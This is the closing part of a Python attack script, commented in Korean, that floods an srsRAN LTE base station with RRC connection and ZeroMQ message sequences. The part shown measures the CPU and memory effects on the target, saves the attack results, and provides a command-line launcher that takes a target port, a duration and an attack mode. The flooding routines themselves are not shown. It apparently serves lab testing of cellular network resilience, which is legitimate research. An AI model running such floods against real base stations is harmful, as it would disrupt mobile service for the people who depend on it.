                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(count, duration)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 플러딩 완료 ===")
        self.log_message(f"총 {count}개 메시지/시퀀스 전송")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='실제 UE 메시지를 사용한 공격')
    parser.add_argument('--target-port', type=int, default=2001, help='eNB 포트 (기본값: 2001)')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'all'], 
                       default='mixed', help='공격 유형')
    
    args = parser.parse_args()
    
    attacker = RealUEAttack(args.target_port)
    
    try:
        if args.attack_type == 'rrc':
            attacker.rrc_connection_flood(args.duration)
        elif args.attack_type == 'zeromq':
            attacker.zeromq_sequence_flood(args.duration)
        elif args.attack_type == 'all':
            attacker.run_all_attacks(args.duration)
        else:
            attacker.mixed_flood(args.duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attacker.running = False

if __name__ == "__main__":
    main()
